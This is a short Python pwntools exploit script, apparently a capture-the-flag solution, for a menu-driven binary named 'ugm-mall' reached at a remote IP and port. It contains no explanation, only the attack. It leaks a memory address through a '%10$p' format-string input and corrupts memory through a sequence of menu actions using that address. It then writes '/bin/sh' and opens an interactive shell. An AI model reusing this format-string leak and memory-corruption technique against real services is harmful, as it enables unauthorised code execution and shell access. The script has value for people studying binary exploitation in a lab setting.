from pwn import *

elf = context.binary = ELF("ugm-mall",checksec=False)

p = process([elf.path])
p = remote("72.62.122.167",5001)
def send(s):
	p.readuntil(" >> ")
	p.sendline(s)


free_offset = 22

send("1")
send("%10$p"+','*free_offset+"bebas")
send("format string and argslen payload")

send("1")
send("AAAAAAA BBBBBBB")
send("CCCCCCC DDDDDDD")

send("1") 
send("EEEEEEE FFFFFFF")
send("GGGGGGGGHHHHHHHH")

send("2") 
send("0")
send("0")
keranjang_kuning = int(str(p.readuntil("\n"))[2:-3],16)+32
print("alamat keranjang_kuning: "+str(hex(keranjang_kuning)))

send("4") 
send("0")
send("5") 
send(p64(keranjang_kuning))

send("3") 
send("2") 
send("/bin/sh")

send("6")

p.interactive()